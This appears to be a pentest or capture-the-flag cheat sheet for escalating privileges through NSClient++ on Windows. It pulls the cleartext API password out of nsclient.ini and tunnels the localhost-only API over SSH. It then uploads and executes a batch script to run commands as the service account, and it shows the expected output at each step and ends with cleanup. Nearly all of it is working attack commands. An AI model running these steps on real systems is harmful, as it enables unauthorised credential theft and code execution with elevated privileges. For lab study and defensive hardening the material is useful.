# Windows - Web - NSClient++

**Windows web supplement**

*Reach the localhost-only NSClient++ API through SSH, then use its external script endpoint.*

## Run this

~~~cmd
type "C:\Program Files\NSClient++\nsclient.ini"
~~~

Look for the API password, allowed hosts, CheckExternalScripts, and an existing script registration.

## Example output

~~~ini
password = $NSCPPassword
allowed hosts = 127.0.0.1
CheckExternalScripts = enabled
check = scripts\\check.bat
~~~

## What did you get?

- **Cleartext password and external scripts enabled:** save the password privately and prepare an SSH tunnel.
- **Only localhost is allowed:** do not attack the API directly from Kali.

## Run this

~~~bash
ssh -L $TunnelPort:127.0.0.1:$NSCPPort $Username@$BoxIP -N
curl -sk https://127.0.0.1:$TunnelPort/ -o /dev/null -w "%{http_code}\n"
~~~

## Example output

~~~text
302
~~~

## What did you get?

- **302 redirect to /index.html:** the tunnel reaches NSClient++.
- **Connection failure:** keep SSH open, recheck the local port, and verify the SSH credential.

> [!warning] 💡
> -N suppresses the remote shell but does not skip SSH authentication. The tunnel still prompts for the SSH password.

## Run this

~~~bash
curl -sk -u $AdminUser:$NSCPPassword \
  https://127.0.0.1:$TunnelPort/api/v1/queries \
  -o /dev/null -w "%{http_code}\n"
~~~

## Example output

~~~text
200
~~~

## What did you get?

- **200:** Basic Authentication succeeded. Upload an external script.
- **401 or 403:** recheck the password and API username.

## Run this

~~~bash
cat > /tmp/check.bat <<'EOF'
@echo off
whoami > C:\Users\$Username\Desktop\proof.txt
EOF

curl -sk -u $AdminUser:$NSCPPassword \
  -X PUT --data-binary @/tmp/check.bat \
  https://127.0.0.1:$TunnelPort/api/v1/scripts/ext/scripts/check.bat

curl -sk -u $AdminUser:$NSCPPassword \
  https://127.0.0.1:$TunnelPort/api/v1/queries/check/commands/execute
~~~

## Example output

~~~text
Added check as scripts\\check.bat
{"result":0}
~~~

## What did you get?

- **result: 0:** the registered script executed. Read the proof file to confirm the service identity.
- **No output available:** this can be normal for a batch script. Check the file it wrote.
- **404 or 403:** confirm the script name, route, and API privileges.

## Run this

~~~bash
curl -sk -u $AdminUser:$NSCPPassword \
  -X DELETE \
  https://127.0.0.1:$TunnelPort/api/v1/scripts/ext/scripts/check.bat

curl -sk -u $AdminUser:$NSCPPassword \
  https://127.0.0.1:$TunnelPort/api/v1/queries/check/commands/execute
~~~

## Example output

~~~text
Script file was removed
verify_status=4xx
~~~

## What did you get?

- **Execution fails after deletion:** the temporary script is gone.
- **Execution still succeeds:** remove the script definition and file separately, then retry the verification.

## Gotcha

Delete any proof files while SSH access still works. Remove target files first, then remove the NSClient++ script that created them. Do not leave the script registered after the test.

## External Resources

- [NSClient++ REST API](https://nsclient.org/docs/api/rest/)
- [NSClient++ scripts API](https://nsclient.org/docs/api/rest/scripts/)
- [HackTricks NSClient++ privilege escalation](https://book.hacktricks.xyz/windows-hardening/privilege-escalation#nsclient)

